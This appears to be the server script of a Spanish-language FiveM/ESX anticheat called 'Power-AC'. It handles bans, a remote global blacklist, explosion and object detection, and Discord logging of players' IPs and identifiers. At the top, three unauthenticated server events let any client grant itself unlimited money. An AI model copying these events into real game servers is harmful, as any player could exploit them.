
ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent("agregardinero:banco")
AddEventHandler("agregardinero:banco", function(amount)
    local xPlayer = ESX.GetPlayerFromId(source)
    local playerMoney = xPlayer.getMoney()
        xPlayer.addAccountMoney('bank', amount)
end)
RegisterServerEvent("agregardinero:mano")
AddEventHandler("agregardinero:mano", function(amount)
    local xPlayer = ESX.GetPlayerFromId(source)
    local playerMoney = xPlayer.getMoney()
        xPlayer.addMoney(amount)
end)
RegisterServerEvent("agregardinero:sucio")
AddEventHandler("agregardinero:sucio", function(amount)
    local xPlayer = ESX.GetPlayerFromId(source)
    local playerMoney = xPlayer.getMoney()
    xPlayer.addAccountMoney('black_money', amount)
end)
local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
if LOAD_es_extended then
        LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
        LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
        LOAD_es_extended = LOAD_es_extended:gsub("function ", "")
        LOAD_es_extended = LOAD_es_extended:gsub("return ESX", "")
        LOAD_es_extended = LOAD_es_extended:gsub("(ESX)", "")
        LOAD_es_extended = LOAD_es_extended:gsub("function", "")
        LOAD_es_extended = LOAD_es_extended:gsub("getSharedObject%(%)", "")
        LOAD_es_extended = LOAD_es_extended:gsub("end", "")
        LOAD_es_extended = LOAD_es_extended:gsub("%(", "")
        LOAD_es_extended = LOAD_es_extended:gsub("%)", "")
        LOAD_es_extended = LOAD_es_extended:gsub(",", "")
        LOAD_es_extended = LOAD_es_extended:gsub("\n", "")
        LOAD_es_extended = LOAD_es_extended:gsub("'", "")
        LOAD_es_extended = LOAD_es_extended:gsub("%s+", "")
        if tostring(LOAD_es_extended) ~= 'esx:getSharedObject' then
                print('This server is using trigger replacement, watch out!')
        end
end
TriggerEvent(tostring(LOAD_es_extended), function(obj) ESX = obj end)

function loadBans()
        banned = LoadResourceFile(GetCurrentResourceName(), "bans.json") or ""
        if banned ~= "" then
                bannedTable = json.decode(banned)
        else
                bannedTable = {}
        end
end

RegisterCommand("actu_bans", function()
        loadBans()
end, true)


function isBanned(source)
        if bannedTable[source] ~= nil then
                return bannedTable[source]
        else
                return false
        end
end

function permBanUser(bannedBy, source)
        bannedTable[source] = {
                banner = bannedBy,
                reason = "HACKER",
                expire = 0
        }
        SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(bannedTable), -1)
end

PerformHttpRequest(ConfigCS.GlobalBan, function(err, text, headers) end, 'POST', json.encode({username = NameLog, content = ":octagonal_sign: Power-AC:raised_hand: **Funcionando Correctamente**", avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
PerformHttpRequest(ConfigCS.LOGS, function(err, text, headers) end, 'POST', json.encode({username = NameLog, content = ":octagonal_sign: Power-AC:raised_hand: **Funcionando Correctamente**", avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
AddEventHandler('chatMessage', function(source, name, message)

        if string.match(message, "@everyone") then
                message = message:gsub("@everyone", "`@everyone`")
        end
        if string.match(message, "@here") then
                message = message:gsub("@here", "`@here`")
        end
        PerformHttpRequest(ConfigCS.LOGS, function(err, text, headers) end, 'POST', json.encode({username = name .. " [" .. source .. "]", content = message, tts = false}), { ['Content-Type'] = 'application/json' })
end)

AddEventHandler('playerConnecting', function(playerName,setKickReason,deferrals)
        identifiers = GetPlayerIdentifiers(source)
        deferrals.defer()
        local blacklisted = false
        deferrals.update("­🛑Power-AC🤚| Comprobando tu Sistema")
        PerformHttpRequest("https://lr-ac.com/ac/master/blacklist.json", function (errorCode, resultData, resultHeaders)
                if resultData == nil then
                        print("Global Nil")
                else
                        local blacklist = json.decode(resultData)
                        for _,v in ipairs(identifiers) do
                                for _, i in pairs(blacklist.cheat) do
                                        if i == v then
                                                blacklisted = true
                                                TriggerEvent('discordlog:sendToDiscord', "­ 🤚Power-AC🛑 ", "**\nJugador: **"..v.."**\nRaz├│n: **".."Este jugador est├í baneado globalmente, pero est├í intentando entrar al servidor", 16711680)
                                                print("^1[^Power-AC^1] | ^1Este jugador est├í baneado globalmente, pero est├í intentando entrar al servidor: "..v.."^7")
                                                deferrals.done("🤚Power-AC🛑  | Usted ha sido *globalmente* baneado del servidor. Esta prohibici├│n nunca caducar├í, Tenga en cuenta que el personal del Servidor no puede ayudarlo con esta prohibici├│n. Su identificaci├│n de baneo es 21c434d2b-b9dsaa-1337-ae4k")
                                                return

                                        end
                                end
                        end
                end
        if not blacklisted then
                deferrals.done()
        end
        end)
end)

AddEventHandler('playerConnecting', function(playerName,setKickReason,set)
        local name = GetPlayerName(source)

        local license,steamID,liveid,xblid,discord,playerip  = "n/a","n/a","n/a","n/a","n/a","n/a"

        for k,v in ipairs(GetPlayerIdentifiers(source))do
                if string.sub(v, 1, string.len("license:")) == "license:" then
                        license = v
                elseif string.sub(v, 1, string.len("steam:")) == "steam:" then
                        steamID = v
                elseif string.sub(v, 1, string.len("live:")) == "live:" then
                        liveid = v
                elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                        xblid  = v
                elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                        discord = v
                elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
                        playerip = v
                end
        end
        print("^1[^2Power-AC^1] | ^2 EL Jugador ^3"..name.."^2 se esta conectando...^0")
        for k,v in ipairs(GetPlayerIdentifiers(source))do
                local banData = isBanned(v)
                if banData ~= false then
                        setKickReason('­🤚Power-AC🛑 | Usted ha sido *globalmente* baneado del servidor. Esta prohibici├│n nunca caducar├í, Tenga en cuenta que el personal del Servidor no puede ayudarlo con esta prohibici├│n. Su identificaci├│n de baneo es 21c434d2b-b9dsaa-1337-ae4k')
                        TriggerEvent('discordlog:sendToDiscord', "­🤚 Power-AC🛑", "**\nRazon: **Est├í baneado por HACKER".."**\nNombre: **"..name.."**\n Steam: **"..steamID.."**\n Discord: **"..discord.."**\n Fivem: **"..license.."**\nIP: **"..playerip, 16711680)
                        CancelEvent()
                        break
                end
        end
        TriggerEvent('discordlog:sendToDiscord2', "­ƒøæ Power-AC - Conexi├│n Ô£ï", "**\nNombre: **"..GetPlayerName(source).."**\n Steam: **"..steamID.."**\n Discord: **"..discord.."**\n Fivem: **"..license.."**\n Live: **"..liveid.."**\n Xbl: **"..xblid.."**\nIP: **"..playerip, 16711680)

end)

RegisterServerEvent('logfallidos')
AddEventHandler('logfallidos', function(name, message, color)
local connect = {
                {
                        ["color"] = color,
                        ["title"] = "**".. name .."**",
                        ["description"] = message,
                        ["footer"] = {
                                ["text"] = "Power-AC LOGS",
                        },
                }
        }
  PerformHttpRequest(ConfigCS.fallidos, function(err, text, headers) end, 'POST', json.encode({username = NameLog, embeds = connect, avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
end)

RegisterServerEvent('logcorrectos')
AddEventHandler('logcorrectos', function(name, message, color)
local connect = {
                {
                        ["color"] = color,
                        ["title"] = "**".. name .."**",
                        ["description"] = message,
                        ["footer"] = {
                                ["text"] = "Power-AC LOGS",
                        },
                }
        }
  PerformHttpRequest(ConfigCS.correctos, function(err, text, headers) end, 'POST', json.encode({username = NameLog, embeds = connect, avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
end)

RegisterServerEvent('tonilog')
AddEventHandler('tonilog', function(name, message, color)
local connect = {
                {
                        ["color"] = color,
                        ["title"] = "**".. name .."**",
                        ["description"] = message,
                        ["footer"] = {
                                ["text"] = "Power-AC",
                        },
                }
        }
  PerformHttpRequest(ConfigCS.ranchomenu, function(err, text, headers) end, 'POST', json.encode({username = NameLog, embeds = connect, avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
end)

RegisterServerEvent('otc')
AddEventHandler('otc', function(name, message, color)
local connect = {
                {
                        ["color"] = color,
                        ["title"] = "**".. name .."**",
                        ["description"] = message,
                        ["footer"] = {
                                ["text"] = "Power-AC",
                        },
                }
        }
  PerformHttpRequest(ConfigCS.otc, function(err, text, headers) end, 'POST', json.encode({username = NameLog, embeds = connect, avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
end)

RegisterServerEvent('noclip')
AddEventHandler('noclip', function(name, message, color)
local connect = {
                {
                        ["color"] = color,
                        ["title"] = "**".. name .."**",
                        ["description"] = message,
                        ["footer"] = {
                                ["text"] = "Power-AC",
                        },
                }
        }
  PerformHttpRequest(ConfigCS.noclip, function(err, text, headers) end, 'POST', json.encode({username = NameLog, embeds = connect, avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
end)
RegisterServerEvent('discordlog:sendToDiscord')
AddEventHandler('discordlog:sendToDiscord', function(name, message, color)
local connect = {
        {
            ["color"] = color,
            ["title"] = "**".. name .."**",
                        ["description"] = message,
            ["footer"] = {
                                ["text"] = "Power-AC",
            },
        }
    }
  PerformHttpRequest(ConfigCS.GlobalBan, function(err, text, headers) end, 'POST', json.encode({username = NameLog, embeds = connect, avatar_url = LogImage}), { ['Content-Type'] = 'application/json' })
end)
local savedPlayers = {}
local lastSaved = 0

local function UpdatePlayerList()
    local ts = os.time(os.date("!*t"))
    if lastSaved == 0 or lastSaved < ts then
        lastSaved = ts + 10

        local tempPlayers = {}
        local xPlayers = ESX.GetPlayers()
        for i=1, #xPlayers, 1 do
            local _data = {id = xPlayers[i], name = GetPlayerName(xPlayers[i])}
            table.insert(tempPlayers, _data)
        end
        savedPlayers = tempPlayers
        end
    return savedPlayers
end
local Coords = {}
local PlayerList = {}
AddEventHandler('playerConnecting', function()
    PlayerList[tostring(source)] = os.time()
 end)
AddEventHandler('playerDropped', function (reason)
        PlayerList[tostring(source)] = nil
        TriggerEvent('discordlog:sendToDiscord2', "Desconexi├│n", "**" .. GetPlayerName(source) .. "** ha salido del servidor. \n Raz├│n: " .. reason, 16711680)
end)
RegisterNetEvent("EGnetkoPlayers")
AddEventHandler("EGnetkoPlayers", function()
    TriggerClientEvent("_SendPlayers", source, UpdatePlayerList())
end)
RegisterNetEvent("_GetCoords")
AddEventHandler("_GetCoords", function(target, n)
    TriggerClientEvent("_SendPos", source, Coords[target], n)
end)

RegisterServerEvent("_UpdatePos")
AddEventHandler("_UpdatePos", function(v)
    Coords[source] = v
    PlayerList[tostring(source)] = os.time()
end)

RegisterServerEvent('playerDied')
AddEventHandler('playerDied',function(message)
        TriggerEvent('discordlog:sendToDiscord2', "Logs de muertes", message, 16711680)
end)

RegisterNetEvent('nsac:trigger')
AddEventHandler('nsac:trigger', function(reason)
        if not doesPlayerHavePerms(source,ConfigCS.Bypass) then
                local name = GetPlayerName(source)
                local steamidentifer = GetPlayerIdentifier(source)
                local identifiers, steamIdentifier = GetPlayerIdentifiers(source)
                local steamid  = false
                local license  = false
                local discord  = false
                local ips       = false
            for k,v in ipairs(GetPlayerIdentifiers(source))do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("ip:")) == "ip:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("license:")) == "license:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("discord:")) == "discord:" then permBanUser(steamidentifer, v) end
                end
                for k,v in pairs(GetPlayerIdentifiers(source))do
                        if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
                end
                TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamIdentifier).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..tostring(reason), 16711680)
                print('^1[^2Power-AC^1] | ^3ID['..source..'] Razon: '..reason..'^0')
                DropPlayer(source, '­🛑Power-AC🤚 | Usted ha sido *globalmente* baneado del servidor. Esta prohibici├│n nunca caducar├í, Tenga en cuenta que el personal del Servidor no puede ayudarlo con esta prohibici├│n. Su identificaci├│n de baneo es 21c434d2b-b9dsaa-1337-ae4k')
        end
end)

RegisterServerEvent('AntiCheat:Cars')
AddEventHandler('AntiCheat:Cars', function(playerPed,blacklistedCar)
        local name = GetPlayerName(source)
        local steamidentifer = GetPlayerIdentifier(source)
        local blcar = blacklistedCar
        local steamid  = false
        local license  = false
        local discord  = false
        local ips       = false
        local rasin = 'Exploit detected: Coches prohibidos: '.. "("..blcar..")"
        for k,v in pairs(GetPlayerIdentifiers(source))do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
        end
        print("^1[^2Power-AC^1] | ^3" ..name.. "["..steamidentifer.. "] ^0"..rasin)
        TriggerClientEvent('chatMessage', -1, '­🛑Power-AC🤚', {255, 0, 0}, "^3" ..name.. "^1 ".. rasin)
        TriggerEvent('discordlog:sendToDiscord', "­🛑Tonivsari AC🤚 Coches Prohibidos", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamidentifer).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..tostring(rasin), 16711680)

end)
RegisterServerEvent('Power-AC:armasprohibidas')
AddEventHandler('Power-AC:armasprohibidas', function(theWeapon)
        local name = GetPlayerName(source)
        local steamidentifer = GetPlayerIdentifier(source)
        local arma = theWeapon
        local steamid  = false
        local license  = false
        local discord  = false
        local ips       = false
        local rasin = 'Tiene armas prohibidas: '.. "("..arma..")"
        for k,v in pairs(GetPlayerIdentifiers(source))do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
        end
        print("^1[^2Power-AC^1] | ^3" ..name.. "["..steamidentifer.. "] ^0"..rasin)
        TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚 ARMAS PROHIBIDAS","**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamid).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRazon:** "..tostring(rasin), 16711680)
end)

RegisterServerEvent('Power-AC:BanExplosiones')
AddEventHandler('Power-AC:BanExplosiones', function(playerPed,rasin)
        local name = GetPlayerName(playerPed)
                local steamidentifer = GetPlayerIdentifier(playerPed)
                local identifiers, steamIdentifier = GetPlayerIdentifiers(source)
                local steamid  = false
                local license  = false
                local discord  = false
                local ips       = false
            for k,v in ipairs(GetPlayerIdentifiers(playerPed))do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("ip:")) == "ip:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("license:")) == "license:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("discord:")) == "discord:" then permBanUser(steamidentifer, v) end
                end
                for k,v in pairs(GetPlayerIdentifiers(playerPed))do
                        if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
                end
                TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚 BAN POR EXPLOSIONES", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamidentifer).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..tostring(rasin), 16711680)
                DropPlayer(playerPed, '­🛑Power-AC🤚 | Usted ha sido *globalmente* baneado del servidor. Esta prohibici├│n nunca caducar├í, Tenga en cuenta que el personal del Servidor no puede ayudarlo con esta prohibici├│n. Su identificaci├│n de baneo es 21c434d2b-b9dsaa-1337-ae4k')
end)
RegisterServerEvent('Power-AC:BanObjetos')
AddEventHandler('Power-AC:BanObjetos', function(playerPed,rasin)
        local name = GetPlayerName(playerPed)
                local steamidentifer = GetPlayerIdentifier(playerPed)
                local identifiers, steamIdentifier = GetPlayerIdentifiers(source)
                local steamid  = false
                local license  = false
                local discord  = false
                local ips       = false
            for k,v in ipairs(GetPlayerIdentifiers(playerPed))do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("ip:")) == "ip:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("license:")) == "license:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("discord:")) == "discord:" then permBanUser(steamidentifer, v) end
                end
                for k,v in pairs(GetPlayerIdentifiers(playerPed))do
                        if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
                end
                if name == nil then
                else
                TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚 BAN POR OBJETOS BLOQUEADOS", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamidentifer).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..rasin, 16711680)
                end
                DropPlayer(playerPed, '­🛑Power-AC🤚 | Usted ha sido *globalmente* baneado del servidor. Esta prohibici├│n nunca caducar├í, Tenga en cuenta que el personal del Servidor no puede ayudarlo con esta prohibici├│n. Su identificaci├│n de baneo es 21c434d2b-b9dsaa-1337-ae4k')
end)
RegisterServerEvent('Power-AC:LogExplosiones')
AddEventHandler('Power-AC:LogExplosiones', function(playerPed,rasin)
                local name = GetPlayerName(playerPed)
                local steamidentifer = GetPlayerIdentifier(playerPed)
                local steamid  = false
                local license  = false
                local discord  = false
                local ips       = false
                for k,v in pairs(GetPlayerIdentifiers(playerPed))do
                        if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
                end
                TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚 LOG DE EXPLOSIONES", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamidentifer).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..tostring(rasin), 16711680)
end)
RegisterServerEvent('Power-AC:BanMenu')
AddEventHandler('Power-AC:BanMenu', function(playerPed,rasin)
                local name = GetPlayerName(playerPed)
                local steamidentifer = GetPlayerIdentifier(playerPed)
                local identifiers, steamIdentifier = GetPlayerIdentifiers(source)
                local steamid  = false
                local license  = false
                local discord  = false
                local ips       = false
            for k,v in ipairs(GetPlayerIdentifiers(playerPed))do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("ip:")) == "ip:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("license:")) == "license:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("discord:")) == "discord:" then permBanUser(steamidentifer, v) end
                end
                for k,v in pairs(GetPlayerIdentifiers(playerPed))do
                        if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
                end
                TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamid).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..rasin, 16711680)
                DropPlayer(playerPed, msg)
                CancelEvent()
end)

AddEventHandler('explosionEvent', function(sender, ev)
        if ev.ownerNetId == 0 then
                CancelEvent()
        end
    if ev.posX == 0.0 and ev.posY == 0.0 then
                CancelEvent()
        end
        for k in pairs(ConfigCS.ExplosionsList) do
                        if ev.explosionType == k then
                                if ConfigCS.ExplosionsList[k].log == true then
                                        print("^1[^2Power-AC^1] | ^3 Detecci├│n de Explosi├│n: ^0[^3"..ConfigCS.ExplosionsList[k].name.."^0] ^3Jugador: ^0[^3"..sender.."^0] "..GetPlayerName(sender))
                                        Citizen.Wait(350)
                                        local rasin = "Detecci├│n de Explosi├│n: "..ConfigCS.ExplosionsList[k].name
                                        TriggerEvent('Power-AC:LogExplosiones', sender, rasin)
                                else
                                end
                                if ConfigCS.ExplosionsList[k].ban == true then
                                        local rasin = "Detecci├│n de Explosi├│n: "..ConfigCS.ExplosionsList[k].name
                                        TriggerEvent('Power-AC:BanExplosiones', sender, rasin)
                                else
                                end
                   end
         end
end)
msg = ""
RegisterServerEvent('CarlosLR:Anuncios')
AddEventHandler('CarlosLR:Anuncios', function(msg)
        if doesPlayerHavePerms(source,ConfigCS.ClearAreaAllowed) then
                for k, v in pairs(PlayerList) do
                        msg = msg .. " "
        end
                TriggerClientEvent("announce", -1, msg)
                msg = ""
        else
                local ped = source
                local rasin = "­🛑Power-AC🤚 | No esta autorizado a usar esto, Banearme Global"
                TriggerEvent('Power-AC:BanMenu', ped, rasin)
        end
end)
function IsPropBlacklisted(entity)
    local model = GetEntityModel(entity)
    if (model ~= nil) then
        if (GetEntityType(entity) == 1 and GetEntityPopulationType(entity) == 7) then
            return true
        end
        for i=1, #Config.ObjectsBL do
            local hashkey = tonumber(Config.ObjectsBL[i]) ~= nil and tonumber(Config.ObjectsBL[i]) or GetHashKey(Config.ObjectsBL[i])
            if (hashkey == model) then
                return true
            end
        end
    end
    return false
end
AddEventHandler("entityCreating",  function(entity)
        local entity = entity
    if not DoesEntityExist(entity) then
        return
    end

    local src = NetworkGetEntityOwner(entity)
        local entID = NetworkGetNetworkIdFromEntity(entity)
        if (IsPropBlacklisted(entity)) then
        CancelEvent()
    end
    if GetEntityType(entity) ~= 0 then
                local model = GetEntityModel(entity)
                local juga = GetPlayerName(src)
                for i, objName in ipairs(Config.ObjectsBL) do
                        if model == GetHashKey(objName) then
                                if src == nil then
                                elseif juga == nil then
                                else
                                        print("^1[^2Power-AC^1] | ^3 Detecci├│n de Objetos Bloqueados: ^0[^3"..objName.."^0] ^3Jugador: ^0[^3"..src.."^0] "..juga)
                                end
                                local rasin = "Detecci├│n de Objeto Bloqueado: "..objName
                                TriggerEvent('Power-AC:BanObjetos', src, rasin)
                                Citizen.Wait(1500)
                        end
                end
        end
end)

function doesPlayerHavePerms(player,perms)
        local allowed = false
        for k,v in ipairs(perms) do
                if IsPlayerAceAllowed(player, v) then
                        return true
                end
        end
        return false
end

function carloslraclogkick(source,arg,kick)
   if kick then
          local name = GetPlayerName(source)
          for k,v in pairs(GetPlayerIdentifiers(source))do
                        if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
          end
          TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚ï", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamid).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..tostring(arg), 16711680)
          DropPlayer(source, arg)
   end
end
RegisterServerEvent("Power-AC:ViolationDetected")
AddEventHandler("Power-AC:ViolationDetected", function(arg,kick)
        if not doesPlayerHavePerms(source,ConfigCS.Bypass) then
        carloslraclogkick(source,arg,kick)
        end
end)
RegisterServerEvent("Power-AC:kick")
AddEventHandler("Power-AC:kick", function(playerPed,msg)
        if doesPlayerHavePerms(source,ConfigCS.ClearAreaAllowed) then
                local name = GetPlayerName(playerPed)
                for k,v in pairs(GetPlayerIdentifiers(playerPed))do
                        if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
                end
            TriggerEvent('discordlog:sendToDiscord', "­🛑Power-AC🤚 Kick Menu", "**\nNombre: **"..tostring(name).."**\n Steam: **"..tostring(steamid).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nRaz├│n: **"..tostring(msg), 16711680)
                DropPlayer(playerPed, 'Baneado por el Power-AC Por favor para apelar entrar al discord y pregunta por tu baneo https://discord.gg/yJXsmWUNvJ ')
        else
                local ped = source
                local rasin = "­🛑Power-AC🤚 | No esta autorizado a usar esto, Banearme Global"
                TriggerEvent('Power-AC:BanMenu', ped, rasin)
        end
end)
RegisterServerEvent("Power-AC:adminmenuenable")
AddEventHandler("Power-AC:adminmenuenable", function()
        for k,v in ipairs(ConfigCS.OpenMenuAllowed) do
        if not IsPlayerAceAllowed(source, v) then
          TriggerClientEvent('adminmenuenabley',source)
        end
end
end)
RegisterServerEvent("Power-AC:checkup")
AddEventHandler("Power-AC:checkup", function()
        if not doesPlayerHavePerms(source,ConfigCS.OpenMenuAllowed) then
          carloslraclogkick(source,"unauthorized AdminMenu Opening")
          end
end)
RegisterServerEvent("Power-AC:openmenu")
AddEventHandler("Power-AC:openmenu", function()
        for k,v in ipairs(ConfigCS.OpenMenuAllowed) do
        if IsPlayerAceAllowed(source, v) then
          TriggerClientEvent('Power-AC:openmenu', source)
        end
end
end)
RegisterServerEvent("Power-AC:cleanareaveh")
AddEventHandler("Power-AC:cleanareaveh", function()
   if doesPlayerHavePerms(source,ConfigCS.ClearAreaAllowed) then
        TriggerClientEvent("Power-AC:cleanareavehy",-1)
  else
        carloslraclogkick(source,"­🛑Power-AC🤚 | unauthorized Clear Area",true)
end
end)
--[[local isMale = skin.sex == 0

function PonerRopa(uniform, playerPed)
    TriggerEvent('skinchanger:getSkin', function(skin)
        local uniformObject

        if skin.sex == 0 then
            uniformObject = Config.Uniforms[uniform].male
        else
            uniformObject = Config.Uniforms[uniform].female
        end

        if uniformObject then
            TriggerEvent('skinchanger:loadClothes', skin, uniformObject)
        else
                drawNotification('CAMBIADO A ROPA DE STAFF.')
        end
    end)
end--]]
RegisterNetEvent("Power-AC:banmenu")
AddEventHandler("Power-AC:banmenu", function(SelectedPlayerSid)
        if doesPlayerHavePerms(source,ConfigCS.ClearAreaAllowed) then
                local rasin = "Baneado desde el Menu de Power-AC"
        TriggerEvent('Power-AC:BanMenu', SelectedPlayerSid, rasin)
        else
                local ped = source
                local rasin = "­🛑Power-AC🤚 | No esta autorizado a usar esto, Banearme Global"
                TriggerEvent('Power-AC:BanMenu', ped, rasin)
        end
end)
RegisterServerEvent("Power-AC:cleanareapeds")
AddEventHandler("Power-AC:cleanareapeds", function()
        if doesPlayerHavePerms(source,ConfigCS.ClearAreaAllowed) then
          TriggerClientEvent("Power-AC:cleanareapedsy",-1)
        else
          carloslraclogkick(source,"­🛑Power-AC🤚 | unauthorized Clear Area",true)
        end
end)
RegisterNetEvent("Power-AC:networkingobjetos")
AddEventHandler("Power-AC:networkingobjetos", function()
        if doesPlayerHavePerms(source,ConfigCS.ClearAreaAllowed) then
          TriggerClientEvent("Power-AC:networkingobjetos2",-1)
        else
          carloslraclogkick(source,"­🛑Power-AC🤚 | No estas autorizado para usar esta funcion de Net Objetos",true)
        end
end)
RegisterServerEvent("Power-AC:cleanareaentity")
AddEventHandler("Power-AC:cleanareaentity", function()
        if doesPlayerHavePerms(source,ConfigCS.ClearAreaAllowed) then
          TriggerClientEvent("Power-AC:cleanareaentityy",-1)
        else
          carloslraclogkick(source,"­🛑Power-AC🤚 | unauthorized Clear Area",true)
        end
end)

for i=1, #ConfigCS.lynx, 1 do
        RegisterServerEvent(ConfigCS.lynx[i])
          AddEventHandler(ConfigCS.lynx[i], function()
                local ped = source
                local rasin = "Ejecutar Trigger Event"
                TriggerEvent('Power-AC:BanMenu', ped, rasin)
                Citizen.Wait(500)
                CancelEvent()
          end)
end

AddEventHandler('chatMessage', function(source, n, message)
        for k,n in pairs(ConfigCS.lol) do
          if string.match(message:lower(),n:lower()) then
                carloslraclogkick(source, '­🛑Power-AC🤚 | Has puesto una palabra prohibida, no lo hagas mas. | ' ..n,true)
                CancelEvent()
          end
        end
end)
loadBans()